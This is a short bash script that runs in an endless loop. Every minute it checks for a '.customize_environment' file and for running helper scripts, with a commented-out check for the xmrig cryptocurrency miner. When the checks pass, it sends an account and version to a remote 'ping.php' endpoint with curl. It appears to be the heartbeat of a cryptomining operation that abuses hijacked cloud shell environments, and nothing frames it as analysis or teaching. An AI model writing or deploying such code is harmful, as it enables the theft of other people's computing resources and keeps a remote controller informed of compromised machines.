#!/bin/bash

source http

while true
do
   if [ -e '.customize_environment' ] && 
#      pgrep xmrig > /dev/null && 
      pgrep status.sh > /dev/null &&
      pgrep while.sh > /dev/null &&
      pgrep update.sh > /dev/null
   then
       url=$ip'/ping.php?account='$1'&version='$2
       curl $url
   fi
   
   sleep 60
done
